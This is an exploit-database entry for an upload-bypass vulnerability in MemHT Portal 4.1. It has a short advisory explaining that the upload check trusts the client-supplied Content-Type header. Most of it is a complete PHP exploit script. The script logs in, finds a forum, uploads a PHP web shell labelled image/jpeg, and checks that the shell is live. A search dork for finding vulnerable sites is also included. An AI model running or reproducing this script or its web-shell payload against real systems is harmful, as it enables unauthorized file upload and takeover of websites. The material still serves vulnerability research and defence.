@@ -1,0 +1,216 @@
+id: 12758
+date: 06/17/2010
+title: MemHT Portal <= 4.1 Upload ByPass Vulnerabilities
+author: Lord-Anubis
+cves: 
+
+=================================================
+MemHT Portal <= 4.1 Upload ByPass Vulnerabilities
+=================================================
+
+
++-------------------------------------------------------------------------------------------------------------------------------+
+|				 _______         __                ______     							|
+|				|    |  |.--.--.|  |--..-----.    |      |.----..-----..--.--.--.				|
+|				|       ||  |  ||    < |  -__|    |   ---||   _||  -__||  |  |  |				|
+|				|__|____||_____||__|__||_____|    |______||__|  |_____||________|				|
++-------------------------------------------------------------------------------------------------------------------------------+
+| Name: MemHT Portal <= 4.1 Upload ByPass 											|
+| Software: MemHT Portal <= 4.1													|
+| Site: http://www.memht.com													|
+| Download: http://www.memht.com/index.php?page=release&download=full								|
+| Vulnerability: Upload ByPass													|
+| Severity: high ( low / medium / high )											|
+| Tested on: 4.1														|
+| Dork: "MemHT Portal"														|
++-------------------------------------------------------------------------------------------------------------------------------+
+| Author: Lord-Anubis														|
+| Contact: lord.anu bis4[at]gm ail[dot]com											|
+| Date: 16.06.2010 ( dd.mm.yyyy )												|
+| Site: http://lordanubis.altervista.org/											|
++-------------------------------------------------------------------------------------------------------------------------------+
+| Bug File: inc/class/uploadFile.class.php											|
+| 217.	function checkMime() {													|
+| 218.		if (sizeof($this->mime) AND !@in_array($this->FILES[$this->field]['type'],$this->mime)) {			|
+| 219.			$this->error = _ERROR_FILENOTPERMITTED_;								|
+| 220.		}														|
+| 221.	}															|
++-------------------------------------------------------------------------------------------------------------------------------+
+| Bug Explanation:														|
+|	- EN:	In the file inc/class/uploadFile.class.php the control on the file's type uploaded,  happens checking  if the	|
+|		"Content-Type" sended between the  header is on the array $this->mime. Therefore it's possible execute the	|
+|		upload of a PHP file,simply sending the header "Content-Type: image/jpeg\r\n".					|
+|	////////////////////////////////////////////////////////////////////////////////////////////////////////////////////	|
+|	- ITA:	Nel file inc/class/uploadFile.class.php il controllo sul tipo di file caricato avviene verificando se il	|
+|		"Content-Type" inviato tramite header Ð¸ presente nell'array $this->mime. E' quindi possibile effettuare		|
+|		l'upload di un file PHP inviando, semplicemente, l'header "Content-Type: image/jpeg\r\n".			|
+|	////////////////////////////////////////////////////////////////////////////////////////////////////////////////////	|
+|	- PL:	W pliku inc/class/uploadFile.class.php kontrol nad typem wniesionego file przeprowadza sie sprawdzajac		|
+|		"Content-Type" przeslany przez header znajduje sie w array $this->mime. Jest mozliwe przeprowadzic upload file	|
+|		PHP, wprowadzajac po prostu header "Content-Type: image/jpeg\r\n".						|
++-------------------------------------------------------------------------------------------------------------------------------+
+| Exploit:															|
++-------------------------------------------------------------------------------------------------------------------------------+
+<?php
+/**
+ * exploit.php
+ *
+ * Software: MemHT Portal <= 4.1
+ * Author: Lord-Anubis <lord.anu bis4[at]gm ail[dot]com>
+ * Vulnerability: Upload ByPass
+ */
+
+//
+error_reporting(0);
+ini_set("max_execution_time", 0);
+ini_set("default_socket_timeout", 5);
+
+//
+function sendPacket($packet) {
+	global $hostName;
+	if (!$sock = fsockopen(gethostbyname($hostName), 80)) {
+		exit("[-] No response from '{$hostName}'\n");
+	}
+
+	fputs($sock, $packet);
+	while (!feof($sock)) {
+		$html .= fgets($sock);
+	}
+	
+	fclose($sock);
+	return $html;
+}
+
+//
+function randomNum() {
+	for ($i = 0; $i < 15; $i++) {
+		$rand .= rand(0, 9);
+	}
+	
+	return $rand;
+}
+
+//
+function phpCode() {
+	return	"<form method=\"post\" action=\"<?php echo \"?\$_SERVER[QUERY_STRING]\"; ?>\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"upload\" /><input type=\"submit\" name=\"submit\" value=\"submit\" /></form>".
+		"<?php error_reporting(0); set_time_limit(0); \$link = dirname(__FILE__) . DIRECTORY_SEPARATOR . \$_FILES['upload']['name'];".
+		"if (move_uploaded_file(\$_FILES['upload']['tmp_name'], \$link)) { echo \$link; chmod(\$link, 0666); } else { echo \"Error uploading. ( by Lord-Anubis )\"; } ?>";
+}
+
+//
+if ($argc != 5) {
+	exit(
+		"[+] Software: MemHT Portal <= 4.1\n".
+		"[+] Author: Lord-Anubis\n".
+		"[+] Vulnerability: Upload ByPass\n".
+		"[+] Usage: ./exploit [hostName] [path] [userName] [passWord]\n".
+		"[+] Example:\n".
+		"[+] ./exploit 127.0.0.1 / anubis password\n".
+		"[+] ./exploit hostname.com /wowbb/ mark s3cret\n"
+	);
+}
+
+//
+list($cli, $hostName, $path, $userName, $passWord) = $argv;
+
+//
+if (substr($path, 0, 1) != "/")	{ $path = "/$path"; }
+if (substr($path, -1) != "/")	{ $path = "$path/"; }
+
+//
+$postData = "post_username={$userName}&post_password={$passWord}&Submit=Login&login=true";
+$packet   = "POST http://{$hostName}{$path}index.php?page=users HTTP/1.1\r\n";
+$packet  .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$packet  .= "Host: {$hostName}\r\n";
+$packet  .= "Content-Length: ".strlen($postData)."\r\n";
+$packet	 .= "Referer: http://{$hostName}{$path}\r\n\r\n";
+$packet  .= $postData;
+$return   = sendPacket($packet);
+
+//
+preg_match('/login\_user\=(.*?)\;/is',	$return, $return1);
+preg_match('/PHPSESSID\=(.*?)\;/is',	$return, $return2);
+$cookie	 = $return1[1];
+$session = $return2[1];
+
+//
+if ($cookie == 'deleted') {
+	echo("[-] UserName or Password is invalid\n");
+	echo("[-] Exploit failed\n");
+	exit;
+}
+
+//
+for (;;) {
+	if (empty($fid)) {
+		$fid = 1;
+	}
+	
+	if ($fid > 100) {
+		echo("[-] Forum is disbled\n");
+		echo("[-] Exploit failed\n");
+		exit;
+	}
+	
+	if (preg_match('/class\=\'forum_legend\'/is', file_get_contents("http://{$hostName}{$path}index.php?page=forum&op=viewForum&id={$fid}"))) {
+		break;
+	}
+	
+	$fid = $fid + 1;
+}
+
+//
+$boundary = randomNum();
+$fileName = randomNum();
+
+//
+$postArray = array(
+	"name"		=> "Hello Wolrd!!!",
+	"text"		=> "My name is Mark, i'm from 23 years old and i'm from US.",
+	"tags"		=> "",
+	"attachment"	=> phpCode(),
+	"smiles"	=> "1",
+	"notification"	=> "0",
+	"Send"		=> "Send",
+	"ok"		=> "true",
+);
+
+//
+$postData = "";
+foreach ($postArray as $key => $value) {
+	$postData .= "-----------------------------{$boundary}\r\n";
+	$postData .= "Content-Disposition: form-data; name=\"{$key}\"".($key === 'attachment' ? "; filename=\"{$fileName}.php\"" : "")."\r\n";
+	$postData .= ($key === 'attachment' ? "Content-Type: image/jpeg\r\n" : "");
+	$postData .= "\r\n";
+	$postData .= "{$value}\r\n";
+}
+
+//
+$postData .= "-----------------------------{$boundary}--\r\n";
+$packet    = "POST http://{$hostName}{$path}index.php?page=forum&op=newThread&id={$fid} HTTP/1.1\r\n";
+$packet   .= "Accept: image/gif, image/pjpeg, image/jpeg, image/png, image/tiff, image/bmp */*\r\n";
+$packet	  .= "Referer: http://{$hostName}{$path}\r\n";
+$packet   .= "Content-Type: multipart/form-data; boundary=---------------------------{$boundary}\r\n";
+$packet   .= "Host: {$hostName}\r\n";
+$packet   .= "Content-Length: ".strlen($postData)."\r\n";
+$packet   .= "Cookie: PHPSESSID={$session}; login_user={$cookie};\r\n";
+$packet   .= "Connection: Close\r\n\r\n";
+$packet   .= $postData;
+sendPacket($packet);
+
+//
+if (!preg_match('/Lord\-Anubis/is', file_get_contents("http://{$hostName}{$path}pages/forum/attachment/{$fileName}.php"))) {
+	echo("[-] Attachment not found\n");
+	echo("[-] Exploit failed\n");
+	exit;
+}
+
+//
+echo("[+] http://{$hostName}{$path}pages/forum/attachment/{$fileName}.php\n");
+echo("[+] Exploit successfull\n");
+exit;
+?>
+
+
+
+#  0day.today [2023-03-24]  #
